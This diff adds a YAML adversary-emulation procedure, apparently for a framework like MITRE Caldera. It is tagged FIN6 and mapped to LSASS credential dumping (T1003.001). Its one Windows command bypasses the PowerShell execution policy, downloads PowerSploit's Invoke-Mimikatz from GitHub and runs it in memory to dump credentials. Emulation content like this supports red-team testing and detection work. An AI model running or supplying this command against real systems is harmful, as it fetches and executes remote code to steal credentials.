@@ -1,0 +1,22 @@
+id: ccdb8caf-c69e-424b-b930-551969450c57
+metadata:
+  version: 2
+  authors:
+    - privateducky
+    - MITRE
+  tags:
+    - FIN6
+name: PowerSploit Invoke-Mimikatz
+description: |
+  PowerSploit is an open source, offensive security framework comprised of PowerShell modules and scripts that perform
+  a wide range of tasks related to penetration testing. This procedure uses PowerSploit to dump credentials from
+  memory via PowerShell by invoking a remote Mimikatz script.
+tactic: credential-access
+technique:
+  id: T1003.001
+  name: "OS Credential Dumping: LSASS Memory - Invoke-Mimikatz"
+platforms:
+  windows:
+    psh:
+      command: |
+        powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
